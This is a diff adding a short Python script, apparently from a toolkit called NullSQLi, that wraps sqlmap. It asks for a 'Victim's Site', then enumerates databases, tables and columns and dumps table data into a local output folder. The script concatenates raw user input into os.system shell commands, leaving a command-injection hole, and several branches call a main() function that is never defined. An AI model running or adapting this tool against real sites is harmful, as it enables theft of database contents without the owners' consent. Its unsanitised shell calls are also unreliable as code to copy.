@@ -1,0 +1,100 @@
+#!/bin/python
+
+import os,sys,time
+
+r="\033[1;91m"
+g="\033[1;92m"
+b="\033[1;96m"
+y="\033[1;93m"
+w="\033[1;97m"
+p=print
+o=os.system
+
+def banner():
+	o("clear && cat $HOME/NullSQLi/banner.txt | lolcat")
+
+#//Back Module
+def back_module():
+	back = input(y + "Do you want to go back to main menu?" + w + "[" + g + "Y" + w + "/" + r + "n" + w + "]: " + b)
+	if not back:
+		p(r + "\nUnknown Command!!\n")
+		time.sleep(2)
+		o("clear")
+		return(back_module())
+	elif back == "y" or back == "Y" or back == "yes" or back == "Yes" or back == "YES":
+		time.sleep(1.5)
+		sql_injection()
+	
+	elif back == "n" or back == "N" or back == "no" or back == "No" or back == "NO":
+		o("clear && figlet -c Happy Hacking Day | lolcat")
+	else:
+		p(r + "\nInvalid command!\n")
+		time.sleep(2)
+		o("clear")
+		return(back_module())
+	
+
+#//SQL Injection
+def sql_injection():
+	try:
+		banner()	
+		target = input(y + "Enter Victim's Site > " + g)
+	
+		if not target:
+			p(r + "Unknown command!\n")
+			time.sleep(3)
+			return(main())	
+		else:
+			
+			p("\n:: Target site database information ::\n")		
+			o("sqlmap -u " + target + " --dbs --batch --output-dir=$HOME/NullSQLi/output/sqli/ | grep -i 'retrieved: \| resumed: \| current database: '")
+						
+			table = input(y + "DB Table > " + g)
+		
+			if not table:
+				p(r + "Unknown command!\n")
+				time.sleep(3)
+				return(sql_injection())			
+			else:
+			
+				p("\n:: Target site tables information ::\n")	
+				o("sqlmap -u " + target + " -D " + table + " --tables --batch --output-dir=$HOME/NullSQLi/output/sqli/ | grep -i 'retrieved: \| resumed: \| current database: '")	
+		
+				Columns = input(y + "DB Columns > " + g)		
+		                            		
+				if not Columns:
+					p(r + "Unknown command!\n")
+					time.sleep(3)
+					return(sql_injection())				        
+				else:
+				
+					p("\n:: Target site columns information ::\n")					
+					o("sqlmap -u " + target + " -D " + table + " -T " + Columns + " --columns --batch --output-dir=$HOME/NullSQLi/output/sqli/ | grep -i 'retrieved: \| resumed: \| current database: '")	
+		
+					Dump = input(y + "DB Dump Data ? " + r + "[" + g + "Y" + w+ "/" + r + "n" + w + "] " + y + "> " + g)	
+				
+					if not Dump:
+						p(r + "Unknown command!\n")
+						time.sleep(3)
+						return(sql_injection())	
+					
+					elif Dump == "y" or Dump == "Y":
+					
+						p("\n:: Target site dump data information ::\n")	
+						o("sqlmap -u " + target + " -D " + table + " -T " + Columns + " --dump --batch --output-dir=$HOME/NullSQLi/output/sqli/ | grep -i 'retrieved: \| resumed: \| current database: '")
+						return(back_module())					
+				
+				
+					elif Dump == "n" or Dump == "N":				
+						time.sleep(3)
+						return(main())	
+						
+					else:
+						p(r + "Unknown command!\n")
+						time.sleep(3)
+						return(sql_injection())	
+	except KeyboardInterrupt:
+		o("clear")	
+		back_module()
+		
+sql_injection()		
